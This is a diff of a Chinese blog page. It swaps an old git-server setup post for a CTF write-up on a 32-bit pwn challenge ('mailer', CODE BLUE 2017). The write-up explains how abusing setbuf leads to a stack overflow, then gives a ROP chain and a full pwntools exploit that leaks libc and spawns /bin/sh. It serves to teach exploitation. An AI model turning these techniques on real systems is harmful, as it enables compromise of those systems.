@@ -3,19 +3,19 @@
 <head>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
-  <title>git小记 | Hc1m1</title>
+  <title>CTF PWN题之setbuf的利用 | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。">
-<meta name="keywords" content="GIT">
+  <meta name="description" content="朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……">
+<meta name="keywords" content="bin">
 <meta property="og:type" content="article">
-<meta property="og:title" content="git小记">
-<meta property="og:url" content="http://0x48.pw/2015/07/22/0x04/index.html">
+<meta property="og:title" content="CTF PWN题之setbuf的利用">
+<meta property="og:url" content="http://0x48.pw/2017/11/11/0x3D/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description" content="今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。">
-<meta property="og:updated_time" content="2017-08-08T09:54:29.000Z">
+<meta property="og:description" content="朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……">
+<meta property="og:updated_time" content="2017-11-11T06:35:02.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="git小记">
-<meta name="twitter:description" content="今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。">
+<meta name="twitter:title" content="CTF PWN题之setbuf的利用">
+<meta name="twitter:description" content="朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……">
   
     <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -253,11 +253,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-0x04" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0x3D" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/07/22/0x04/" class="article-date">
-      <time datetime="2015-07-22T12:30:25.000Z" itemprop="datePublished">2015-07-22</time>
+      <a href="/2017/11/11/0x3D/" class="article-date">
+      <time datetime="2017-11-11T04:28:03.000Z" itemprop="datePublished">2017-11-11</time>
 </a>
     </div>
   
@@ -270,7 +270,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      git小记
+      CTF PWN题之setbuf的利用
     </h1>
   
 
@@ -281,7 +281,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GIT/">GIT</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -291,41 +291,31 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <blockquote>
-<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
-</blockquote>
+        <p>朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……</p>
 <a id="more"></a>
-<p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install git</div></pre></td></tr></table></figure></p>
-<p>之后，既可以做服务端，可以做客户端。</p>
-<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>如果想使用git做服务端，第一步就是创建git用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo adduser git</div></pre></td></tr></table></figure>
-<p>然后就是创建版本库了，比如，我准备把仓库<code>test</code>放在<code>/home/wwwroot/</code>下，则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> /home/wwwroot</div><div class="line">$ mkdir <span class="built_in">test</span></div><div class="line">$ sudo git init --bare <span class="built_in">test</span> </div><div class="line">$ sudo chown -R git:git <span class="built_in">test</span>    <span class="comment">#这句要在创建仓库后再使用</span></div></pre></td></tr></table></figure></p>
-<p>这里有个要说明下，<code>--base</code> 参数是不把项目原文件放在仓库目录下，而是以另一种形式储存，也就是说，如果你把 <code>a.php</code> 文件上传到git仓库，则你在 <code>test</code> 文件夹中根本找不到 <code>a.php</code> 这个文件。</p>
-<p>如果不加 <code>--bare</code> 参数，会出现一系列问题，现在我还没研究透，待我研究透侧了，再来补充。</p>
-<p>这样服务端基本配置就好了，接下来就是客户端了。。</p>
-<h1 id="附"><a href="#附" class="headerlink" title="附"></a>附</h1><p>这里先假设一些东西，</p>
-<blockquote>
-<ol>
-<li>服务器的ip是: 192.168.110.110</li>
-<li>客户端1把项目储存在 ‘/home/wwwroot/default/test’ 目录下</li>
-<li>把项目放在web服务器上 ‘/home/wwwroot/test.com’ 目录中，让外网访问<br>则</li>
-</ol>
-</blockquote>
-<h1 id="客户端1"><a href="#客户端1" class="headerlink" title="客户端1"></a>客户端1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> /home/wwwroot/default</div><div class="line">$ git <span class="built_in">clone</span> git@192.168.110.110:/home/wwwroot/<span class="built_in">test</span></div><div class="line">   <span class="comment"># 输入密码（免输入密码的方法我加在结尾的Other中）</span></div></pre></td></tr></table></figure>
-<p>现在 <code>/home/wwwroot/default/test</code> 就是你的工作目录，或者可以把 <code>/test/.git</code>文件夹移到你的工作目录下。。</p>
-<p>然后就是在有 <code>.git</code> 文件夹下，输入下面命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git add .                <span class="comment">#当前目录下的所以文件加入到版本库中，如果不像所有，可以 git add 具体文件</span></div><div class="line">$ git commit -m <span class="string">"这里你自己随便写"</span></div><div class="line">$ git push origin master</div></pre></td></tr></table></figure>
-<p>上面这是在第一次提交文件，或者git仓库是空的情况下，假如是第二次提交，或者版本库中以有内容，则是。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git commit -am <span class="string">"自己随便写"</span></div><div class="line">$ git push origin master</div></pre></td></tr></table></figure>
-<h1 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> /home/wwwroot/test.com</div><div class="line">$ git <span class="built_in">clone</span> git@192.168.110.110:/home/wwwroot/<span class="built_in">test</span></div><div class="line"> <span class="comment"># 输入密码</span></div></pre></td></tr></table></figure>
-<p>当客户端1的项目更新提交了后，</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git pull origin master</div></pre></td></tr></table></figure>
-<hr>
-<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="免密码"><a href="#免密码" class="headerlink" title="免密码"></a>免密码</h2><p>这里git文件传送使用的是ssh，所以其实也是ssh免输入密码的方式。<br>首先，编辑 <code>/etc/ssh/sshd_config</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ vim /etc/ssh/sshd_config</div><div class="line">AuthorizedKeysFile	.ssh/authorized_keys      <span class="comment">#这句前面的#号去了</span></div></pre></td></tr></table></figure>
-<p>在客户端上使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -P <span class="string">''</span></div><div class="line"> <span class="comment"># 则会在 ~/.ssh/ 目录下生产 id_rsa 和 id_rsa.pub..  这个就是传说中rsa加密的公钥和私钥</span></div></pre></td></tr></table></figure></p>
-<p>把 <code>id_rsa.pub</code> 文件中的内容复制，粘贴到服务端 <code>~/.ssh/authorized_keys</code> 中</p>
-<p><code>authorized_keys</code>文件的权限必须是644<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/.ssh</div><div class="line">$ ls -al</div><div class="line">-rw-r--r--. 1 root root  authorized_keys</div></pre></td></tr></table></figure></p>
+<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn</a></p>
+<p>在拿到这题的时候，看了下是32位的，canary都没开，本以为是很简单的题</p>
+<p>在<code>sub_8048ada</code>函数中发现了一个任意函数调用的漏洞，对于<code>filter</code>输入的数值只检测<code>v3&lt;=2</code>，而v3是int型，所以可以任意调用小于<code>0x804b048</code>的函数，但是参数却不能控制，第一个参数是<code>fopen(&quot;/dev/null&quot;)</code>的文件描述符，第二个参数是buf，第三个参数为长度</p>
+<p>初次之外就找不到别的漏洞了，在参数无法控制的情况下，只能利用该bin中的本身函数，没有任何getshell的思路</p>
+<p>然后在大佬的教导下，我第一次注意到了<code>setbuf</code>函数，大部分pwn题都会有这个函数，用来设置IO缓冲区的，第一个参数是文件描述符，第二个参数表示缓冲区，一般在pwn题中的用法是<code>setbuf(stdin, 0)</code>表示标准输入取消缓冲区。</p>
+<p>仔细观察还会发现，stdin并不是0，而是在stdio库中设置的一个文件描述符，所以也是作用在stdio库中的函数，比如<code>gets</code>, <code>puts</code>, <code>fread</code>, <code>fwrite</code></p>
+<p>比如，<code>gets</code>函数使用的就是stdin描述符，如果设置了<code>setbuf(stdin, buf)</code>，<code>gets</code>函数则会先从buf中获取输入，自己也可以写个简单的代码测试一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</div><div class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">10</span>);</div><div class="line">	buf[<span class="number">0</span>] = <span class="string">'1'</span>;</div><div class="line">	<span class="built_in">printf</span>(buf);</div><div class="line">	setbuf(<span class="built_in">stdout</span>, buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"test"</span>);</div><div class="line">	write(<span class="number">1</span>, <span class="string">"\n====\n"</span>,<span class="number">6</span>);</div><div class="line">	write(<span class="number">1</span>, buf, <span class="number">10</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后运行一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./a.out</span></div><div class="line">1</div><div class="line">====</div><div class="line">test</div></pre></td></tr></table></figure>
+<p>可以从结果看出，printf根本没有输出<code>test</code>，而是把这个字符串输出到buf缓冲区中了，从而修改了buf中的内容。</p>
+<p>因为设置的是stdout的缓冲区，而stdout是stdio库中的文件描述符，所以write并没有受到影响</p>
+<p>还有一个问题，<code>setbuf</code>并没有设置长度的参数，设置长度的需要使用<code>setvbuf</code>，所以默认情况下setbuf设置的缓冲区长度为默认的4096，这样在该题中就形成了一个攻击链</p>
+<p>控制程序跳转到<code>setbuf</code>函数，简单的讲就是调用<code>setbuf(fd=fopen(&quot;/dev/null&quot;), buf1)</code>，然后在<code>sub_8048742(no_filter)</code>函数中调用了<code>fwrite(fd, 0, buf2, len)</code>，这样就能往buf1中写buf2的数据，而buf是存在栈中的，所以可以造成栈溢出，能栈溢出了，下面就是找ROP链了</p>
+<p>栈溢出构造逻辑：</p>
+<p>add(rop) -&gt; add(buf1) -&gt; buf(buf2) -&gt; add(buf3) -&gt; add(buf4) -&gt; setbuf(fd, buf4) -&gt; post(buf1) -&gt; post(rop) -&gt; 栈溢出，利用ROP链</p>
+<p>下面就是研究怎么构造ROP，我的思路是：</p>
+<p>利用printf泄露libc地址 -&gt; 算出system，字符串<code>/bin/sh</code>地址 -&gt; 构造出第二个system(“/bin/sh”)的ROP链 -&gt; 通过fread写入.bss段 -&gt; 利用ROP把栈修改成.bss段 -&gt; 执行第二个ROP system(“/bin/sh”)</p>
+<p>同样也能利用one_gadget，payload下面会放，这里再讨论一个问题</p>
+<p>我把栈地址修改成<code>0x804b100</code>,执行<code>system(&quot;/bin/sh&quot;)</code>是失败的，然后再和大佬的讨论中发现了几种可能，system需要获取系统的环境变量envp，通过看system的源代码，发现有一个全局指针变量<code>_environ</code>指向栈上的envp，如果这个值被覆盖成了一个无效的地址，system则无法执行。但是在该题中，我的第一个rop并不长，所以并没有覆盖掉envp，之后修改了栈地址，也不存在覆盖envp的情况。</p>
+<p>然后还有第二种情况，system栈地址空间不足，程序的可读可写地址空间是从<code>0x804b000-0x804c000</code>，总长度为0x1000，然后我修改的栈地址为<code>0x804b100</code>，所以system可用的栈空间只有0x100，之后我把栈的地址修改成<code>0x804b700</code>后，就能成功执行<code>system(&quot;/bin/sh&quot;)</code>了</p>
+<p>附上payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = "debug"</span></div><div class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, data)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"contents: "</span>)</div><div class="line">	p.sendline(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(p, n, offset)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"3"</span>)</div><div class="line">	p.readuntil(<span class="string">"ID (0-4): "</span>)</div><div class="line">	p.sendline(str(n))</div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(str(offset))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(p)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"4"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p = process(<span class="string">"./mailer"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">	e = ELF(<span class="string">"./mailer"</span>)</div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line">	gadget1 = <span class="number">0x08048dab</span>   <span class="comment"># pop ebp ; ret</span></div><div class="line">	gadget2 = <span class="number">0x080485f8</span>   <span class="comment"># leave ; ret</span></div><div class="line">	gadget3 = <span class="number">0x08048495</span>   <span class="comment"># pop ebx ; ret</span></div><div class="line">	gadget4 = <span class="number">0x08048daa</span>   <span class="comment"># pop edi ; pop ebp ; ret</span></div><div class="line">	gadget5 = <span class="number">0x08048da9</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">	one_gadget_sh = <span class="number">0x56ff5</span></div><div class="line">	read_buf = <span class="number">0x080486D9</span></div><div class="line">	stdin_bss = <span class="number">0x804B060</span></div><div class="line">	bss_buf = <span class="number">0x804b700</span></div><div class="line">	rop1 = <span class="string">"a"</span>*<span class="number">0xd</span></div><div class="line">	rop1 += p32(e.symbols[<span class="string">"printf"</span>]) + p32(gadget3) + p32(e.got[<span class="string">"printf"</span>]) <span class="comment"># printf(&amp;printf)</span></div><div class="line">	rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(<span class="number">0x100</span>) <span class="comment"># fread(buf, 1, 0x100, stdin)</span></div><div class="line">	rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)</div><div class="line">	add(p, rop1)</div><div class="line">	add(p, <span class="string">"b"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"c"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"d"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"e"</span>*<span class="number">255</span>)</div><div class="line">	post(p, <span class="number">4</span>, <span class="number">-15</span>)</div><div class="line">	post(p, <span class="number">1</span>, <span class="number">0</span>)</div><div class="line">	post(p, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">	quit(p)</div><div class="line">	p.readuntil(<span class="string">":)\n"</span>)</div><div class="line">	printf_got = u32(p.read(<span class="number">4</span>))</div><div class="line">	<span class="comment"># print hex(printf_got)</span></div><div class="line">	system_libc = libc.symbols[<span class="string">"system"</span>]</div><div class="line">	printf_libc = libc.symbols[<span class="string">"printf"</span>]</div><div class="line">	binsh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</div><div class="line">	system_add = printf_got - printf_libc + system_libc</div><div class="line">	binsh_add =  printf_got - printf_libc + binsh_libc</div><div class="line">	one_gadget = printf_got - printf_libc + <span class="number">0x3a838</span></div><div class="line">	<span class="comment">#rop2 = "aaaa" + p32(gadget5) + p32(binsh_add+one_gadget_sh) + "aaaa" + p32(bss_buf) + p32(one_gadget)</span></div><div class="line">	rop2 = <span class="string">"aaaa"</span> + p32(system_add) + p32(binsh_add) + p32(binsh_add)</div><div class="line">	p.sendline(rop2)</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -334,13 +324,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2015/07/22/0x04/">git小记</a></p>
+        <p><span>本文标题:</span><a href="/2017/11/11/0x3D/">CTF PWN题之setbuf的利用</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
-        <p><span>发布时间:</span>2015-07-22, 20:30:25</p>
-        <p><span>最后更新:</span>2017-08-08, 17:54:29</p>
+        <p><span>发布时间:</span>2017-11-11, 12:28:03</p>
+        <p><span>最后更新:</span>2017-11-11, 14:35:02</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2015/07/22/0x04/" title="git小记">http://0x48.pw/2015/07/22/0x04/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2015/07/22/0x04/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/11/0x3D/" title="CTF PWN题之setbuf的利用">http://0x48.pw/2017/11/11/0x3D/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/11/11/0x3D/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -353,16 +343,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2015/08/07/0x06/">
-                    WeChall Writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2015/07/19/0x02/">
-                    对于硬盘事件的随想
+                <a href="/2017/11/03/0x3C/">
+                    看雪CTF 第四题club_pwn writeup
                 </a>
             </div>
         
@@ -373,7 +357,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#服务端"><span class="toc-number">1.</span> <span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附"><span class="toc-number">2.</span> <span class="toc-text">附</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#客户端1"><span class="toc-number">3.</span> <span class="toc-text">客户端1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web服务器"><span class="toc-number">4.</span> <span class="toc-text">web服务器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other"><span class="toc-number">5.</span> <span class="toc-text">Other</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#免密码"><span class="toc-number">5.1.</span> <span class="toc-text">免密码</span></a></li></ol></li></ol>
+    
 </div>
 <style>
     .left-col .switch-btn {
@@ -424,15 +408,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2015/08/07/0x06/" title="上一篇: WeChall Writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2015/07/19/0x02/" title="下一篇: 对于硬盘事件的随想">
+            <a href="/2017/11/03/0x3C/" title="下一篇: 看雪CTF 第四题club_pwn writeup">
                 <i class="fa fa-angle-right"></i>
             </a>
         
